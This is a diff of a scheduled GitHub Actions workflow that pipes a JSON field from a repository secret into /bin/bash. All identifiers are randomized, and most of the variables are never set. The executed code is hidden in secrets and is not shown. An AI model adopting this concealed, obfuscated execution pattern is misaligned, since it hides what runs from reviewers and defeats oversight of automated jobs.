@@ -1,32 +1,25 @@
 name: penchunfenyou
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 5/6 * * *'
-
+    - cron: '39 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: penchunfenyou
         env:
-          zr73: ${{ secrets.zr73 }}
+          nq56: ${{ secrets.nq56 }}
         run: |
-          echo $zr73 | jq -r .fze123 | /bin/bash
-          echo $iui0880 | jq -r .ocbn1 | /bin/bash
-          echo $prqgt2650 | jq -r .ywi4 | /bin/bash
-          echo $ylpge7500 | jq -r .mb311 | /bin/bash
-          echo $jcbq63941 | jq -r .ky8 | /bin/bash
-          echo $dswb6 | jq -r .c529 | /bin/bash
-          echo $cbg5 | jq -r .g715 | /bin/bash
-          echo $s6284 | jq -r .cb56 | /bin/bash
-          echo $xfz6 | jq -r .m844 | /bin/bash
-          echo $o57 | jq -r .wjdc334 | /bin/bash
-          echo $qkuqk74 | jq -r .ziko3 | /bin/bash
-          echo $qvjf2 | jq -r .fkods7 | /bin/bash
-          echo $bjor26 | jq -r .ole3 | /bin/bash
-          echo $m5472 | jq -r .eshw34716 | /bin/bash
-          echo $b5 | jq -r .jkvng427 | /bin/bash
-          echo $ynkjg90 | jq -r .waci30680 | /bin/bash
+          echo $nq56 | jq -r .tn353 | /bin/bash
+          echo $ywojl9265 | jq -r .phfug9 | /bin/bash
+          echo $ohg9 | jq -r .k37332 | /bin/bash
+          echo $wgkz01248 | jq -r .mr90 | /bin/bash
+          echo $e3 | jq -r .iwh9 | /bin/bash
+          echo $p1960 | jq -r .lnh89215 | /bin/bash
+          echo $c660 | jq -r .cny48294 | /bin/bash
+          echo $ndaj7139 | jq -r .yyg1852 | /bin/bash
 
